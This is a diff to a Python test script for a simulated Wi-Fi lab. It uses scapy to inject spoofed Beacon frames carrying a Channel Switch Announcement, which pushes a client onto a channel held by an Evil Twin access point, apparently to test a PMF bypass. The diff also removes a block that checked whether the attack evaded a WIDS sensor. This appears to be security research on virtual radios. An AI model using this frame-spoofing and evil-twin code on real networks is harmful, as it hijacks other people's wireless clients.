@@ -69,7 +69,14 @@ def ts():
     return datetime.now().strftime("%H:%M:%S")
 
 def log(msg):
-    print(f"[{ts()}] {msg}", flush=True)
+    """Print with explicit CRLF so QTerminal does not stair-step lines."""
+    text = str(msg).replace("\r\n", "\n").replace("\r", "\n")
+    for line in text.split("\n"):
+        if line:
+            sys.stdout.write(f"[{ts()}] {line}\r\n")
+        else:
+            sys.stdout.write("\r\n")
+    sys.stdout.flush()
 
 def run(cmd, shell=True, capture=True, timeout=30):
     """Run a shell command, return stdout or raise on failure."""
@@ -84,6 +91,19 @@ def run(cmd, shell=True, capture=True, timeout=30):
 def sudo(cmd, capture=True, timeout=30):
     return run(f"sudo {cmd}", capture=capture, timeout=timeout)
 
+
+def stop_process(proc, name, timeout=5):
+    """Terminate a background child without letting demo pipes hang."""
+    if not proc or proc.poll() is not None:
+        return
+    log(f"Stopping {name}...")
+    proc.terminate()
+    try:
+        proc.wait(timeout=timeout)
+    except subprocess.TimeoutExpired:
+        proc.kill()
+        proc.wait(timeout=timeout)
+
 def cleanup():
     """Stop all processes and unload hwsim."""
     log("=== CLEANUP ===")
@@ -92,13 +112,20 @@ def cleanup():
         if pid_var:
             try:
                 os.kill(pid_var, signal.SIGTERM)
+                time.sleep(0.2)
             except (ProcessLookupError, TypeError):
                 pass
-    sudo("pkill -f hostapd 2>/dev/null || true")
-    sudo("pkill -f wpa_supplicant 2>/dev/null || true")
-    sudo("pkill -f wmediumd 2>/dev/null || true")
+    subprocess.run(["sudo", "pkill", "-x", "hostapd"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(["sudo", "pkill", "-f", "^/sbin/wpa_supplicant -i wlan"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(["sudo", "pkill", "-x", "wmediumd"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(["sudo", "pkill", "-x", "tcpdump"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(1)
-    sudo("modprobe -r mac80211_hwsim 2>/dev/null || true")
+    subprocess.run(["sudo", "modprobe", "-r", "mac80211_hwsim"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     log("Cleanup done.")
 
 
@@ -377,7 +404,8 @@ def inject_beacon_csa(ap_mac, current_ch, evil_ch, iface, count=30, switch_count
     Inject spoofed Beacon frames with CSA IE via scapy.
     Frames are sent from HOST (not inside a namespace).
     """
-    from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
+    from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, conf, sendp
+    conf.ifaces.reload()
 
     csa_body = bytes([0x01, evil_ch, switch_count])
     frame = RadioTap() / Dot11(
@@ -398,26 +426,15 @@ def inject_beacon_csa(ap_mac, current_ch, evil_ch, iface, count=30, switch_count
 
 
 # ─── Main ──────────────────────────────────────────────────────────────────────
-def main():
-    parser = argparse.ArgumentParser(
-        description="Direct hwsim CSA Injection Test (no Mininet-WiFi)"
-    )
-    parser.add_argument("--hostapd-ver", default="2.10", choices=["2.6", "2.10"],
-                        help="hostapd version (default: 2.10)")
-    parser.add_argument("--evil-channel", type=int, default=EVIL_CHANNEL,
-                        help=f"Target channel for CSA (default: {EVIL_CHANNEL})")
-    parser.add_argument("--beacon-count", type=int, default=30,
-                        help="Number of Beacon CSA frames to inject")
-    parser.add_argument("--no-wmediumd", action="store_true",
-                        help="Skip wmediumd (channels not separated)")
-    parser.add_argument("--pmf", type=int, default=2, choices=[0, 1, 2],
-                        help="PMF mode: 0=disabled, 1=optional, 2=required")
-    parser.add_argument("--wait", type=int, default=15,
-                        help="Seconds to wait after CSA for channel switch")
-    args = parser.parse_args()
+def run_attempt(args, attempt_no, max_attempts):
+    global HOSTAPD_PID, WPAS_PID, WMEDIUMD_PID
+    HOSTAPD_PID = None
+    WPAS_PID = None
+    WMEDIUMD_PID = None
 
     log("=" * 50)
     log("  DIRECT HWSIM CSA INJECTION TEST")
+    log(f"  attempt: {attempt_no}/{max_attempts}")
     log(f"  hostapd: {args.hostapd_ver}  PMF: {args.pmf}")
     log(f"  Channel: {LEGIT_CHANNEL} → {args.evil_channel}")
     log("=" * 50)
@@ -460,7 +477,7 @@ def main():
                 if lp.exists():
                     log(f"--- {name} ---")
                     log(lp.read_text()[:5000])
-            return 1
+            return {"exit_code": 1, "result": "NO_ASSOC"}
 
         # 6. Pre-attack status
         ap_mac = get_ap_mac(IFACE_AP)
@@ -474,6 +491,10 @@ def main():
         # 7. Setup Evil Twin BEFORE CSA injection (so it's ready when station switches)
         evil_result = "SKIPPED"
         pcap_path = None
+        pcap_tmp = None
+        tcpdump_proc = None
+        evil_proc = None
+        wids_proc = None
         ts_str = datetime.now().strftime('%Y%m%d_%H%M%S')
         IFACE_EVIL = ifaces[3] if len(ifaces) >= 4 else None
         
@@ -528,27 +549,29 @@ logger_stdout_level=2
         # 8. Setup injection interface
         setup_monitor_mode(IFACE_INJ, LEGIT_CHANNEL)
 
-        # 8a. Start WIDS sniffer on injection interface (monitor mode)
-        wids_pcap = RAPORT_DIR / "pcaps" / "csa_injection" / f"wids_{args.hostapd_ver}_{ts_str}.pcap"
-        wids_pcap.parent.mkdir(parents=True, exist_ok=True)
-        sniffer_path = RAPORT_DIR.parent / "pmf-bypass-lab-infra" / "wids" / "scapy_sniffer.py"
-        if sniffer_path.exists():
-            log(f"  WIDS sniffer starting on {IFACE_INJ}...")
-            wids_proc = subprocess.Popen(
-                ["sudo", "python3", str(sniffer_path),
-                 "--iface", IFACE_INJ, "--duration", "90",
-                 "--out", str(wids_pcap), "--verbose"],
-                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
-            )
-            time.sleep(2)
-        else:
-            wids_proc = None
+        # 9. Stop tcpdump before injection to avoid frame collision on same iface
+        if IFACE_EVIL and tcpdump_proc:
+            tcpdump_proc.terminate()
+            try:
+                tcpdump_proc.wait(timeout=3)
+            except subprocess.TimeoutExpired:
+                tcpdump_proc.kill()
+            log("  tcpdump paused for CSA injection")
 
-        # 9. Inject Beacon CSA (Evil Twin already waiting on evil channel)
+        # Inject Beacon CSA (Evil Twin already waiting on evil channel)
         inject_beacon_csa(
             ap_mac, LEGIT_CHANNEL, args.evil_channel,
             IFACE_INJ, count=args.beacon_count, switch_count=1
         )
+
+        # Restart tcpdump after injection
+        if IFACE_EVIL:
+            tcpdump_proc = subprocess.Popen(
+                ["sudo", "tcpdump", "-i", IFACE_INJ, "-w", pcap_tmp,
+                 "-s", "0", "-I", "not", "port", "22"],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            time.sleep(1)
 
         # 10. Wait for channel switch + check channel BEFORE disconnect
         log(f"Waiting {args.wait}s for channel switch...")
@@ -618,38 +641,25 @@ logger_stdout_level=2
                 evil_result = "EVIL_TWIN_NO_DISCONNECT"
             
             # Stop tcpdump and copy PCAP to share
-            tcpdump_proc.terminate()
-            try:
-                tcpdump_proc.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                tcpdump_proc.kill()
+            stop_process(tcpdump_proc, "tcpdump")
             # Copy from /tmp/ to VMware share
             pcap_path.parent.mkdir(parents=True, exist_ok=True)
-            if os.path.exists(pcap_tmp) and os.path.getsize(pcap_tmp) > 24:
+            if pcap_tmp and os.path.exists(pcap_tmp) and os.path.getsize(pcap_tmp) > 24:
                 subprocess.run(["sudo", "cp", pcap_tmp, str(pcap_path)], capture_output=True)
                 log(f"  PCAP: {pcap_path} ({os.path.getsize(pcap_tmp)} bytes)")
             else:
                 log(f"  PCAP: empty/missing (tcpdump on injection iface may have captured nothing)")
             
-            # WIDS: parse sniffer output for alert-worthy frames
-            if wids_proc:
-                try:
-                    wids_out, _ = wids_proc.communicate(timeout=10)
-                except subprocess.TimeoutExpired:
-                    wids_proc.kill()
-                    wids_out, _ = wids_proc.communicate()
-                wids_text = wids_out if wids_out else ""
-                deauth_n = wids_text.count("Deauthentication")
-                disassoc_n = wids_text.count("Disassociation")
-                beacon_n = wids_text.count("Beacon")
-                log(f"  WIDS: Beacon={beacon_n} Deauth={deauth_n} Disassoc={disassoc_n}")
-                if deauth_n == 0 and disassoc_n == 0:
-                    log(f"  ✅ WIDS EVASION: No PMF-alert frames — Beacon CSA is stealthy!")
-                log(f"  WIDS PCAP: {wids_pcap}")
         elif not IFACE_EVIL:
             log(f"\n=== EVIL TWIN SKIPPED (need 4 radios, got {len(ifaces)}) ===")
         else:
             log(f"\n=== EVIL TWIN SKIPPED (CSA didn't switch channel) ===")
+
+        # These children are started before CSA. Stop them on every outcome,
+        # especially BLOCKED/ANOMALY, or SSH demos can hang after the log line.
+        stop_process(tcpdump_proc, "tcpdump")
+        stop_process(wids_proc, "WIDS sniffer")
+        stop_process(evil_proc, "Evil Twin hostapd")
 
         # Save log
         log_path = RAPORT_DIR / "logs" / f"direct_csa_{args.hostapd_ver}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
@@ -669,15 +679,59 @@ logger_stdout_level=2
                 f.write(f"PCAP: {pcap_path}\n")
         log(f"Log saved: {log_path}")
 
-        return 0 if result == "SUCCESS" else 1
+        return {
+            "exit_code": 0 if result == "SUCCESS" else 1,
+            "result": result,
+            "log_path": str(log_path),
+            "pre_channel": pre_channel,
+            "post_channel": post_channel,
+            "evil_result": evil_result,
+        }
 
     except Exception as e:
         log(f"ERROR: {e}")
         import traceback
         traceback.print_exc()
-        return 2
+        return {"exit_code": 2, "result": "ERROR"}
     finally:
         cleanup()
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Direct hwsim CSA Injection Test (no Mininet-WiFi)"
+    )
+    parser.add_argument("--hostapd-ver", default="2.10", choices=["2.6", "2.10"],
+                        help="hostapd version (default: 2.10)")
+    parser.add_argument("--evil-channel", type=int, default=EVIL_CHANNEL,
+                        help=f"Target channel for CSA (default: {EVIL_CHANNEL})")
+    parser.add_argument("--beacon-count", type=int, default=30,
+                        help="Number of Beacon CSA frames to inject")
+    parser.add_argument("--no-wmediumd", action="store_true",
+                        help="Skip wmediumd (channels not separated)")
+    parser.add_argument("--pmf", type=int, default=2, choices=[0, 1, 2],
+                        help="PMF mode: 0=disabled, 1=optional, 2=required")
+    parser.add_argument("--wait", type=int, default=15,
+                        help="Seconds to wait after CSA for channel switch")
+    parser.add_argument("--retries", type=int, default=2,
+                        help="Retry timing-sensitive failed/BLOCKED runs (default: 2)")
+    args = parser.parse_args()
+
+    max_attempts = max(1, args.retries + 1)
+    final = None
+    for attempt_no in range(1, max_attempts + 1):
+        final = run_attempt(args, attempt_no, max_attempts)
+        if final["result"] == "SUCCESS":
+            return 0
+
+        if attempt_no < max_attempts and final["result"] in {"BLOCKED", "ANOMALY", "NO_ASSOC", "ERROR"}:
+            log(f"Retrying scenario after {final['result']} (timing issue likely)...")
+            time.sleep(2)
+            continue
+
+        break
+
+    return final["exit_code"] if final else 2
 
 
 if __name__ == "__main__":
